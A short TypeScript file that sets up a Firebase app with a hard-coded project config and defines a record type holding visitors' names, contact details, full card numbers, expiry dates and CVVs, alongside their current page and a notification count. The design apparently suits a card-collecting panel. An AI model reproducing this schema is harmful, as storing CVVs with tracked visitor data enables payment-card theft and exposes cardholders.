import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: 'AIzaSyAD3iyMWhdzQ4VIXZcwCpUJTnqFTe5jt7U',
  authDomain: 'wedsdasd.firebaseapp.com',
  projectId: 'wedsdasd',
  storageBucket: 'wedsdasd.firebasestorage.app',
  messagingSenderId: '299161995646',
  appId: '1:299161995646:web:45b8e58faa99d3e75ccb2f',
  measurementId: 'G-614JDKQGMC',
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

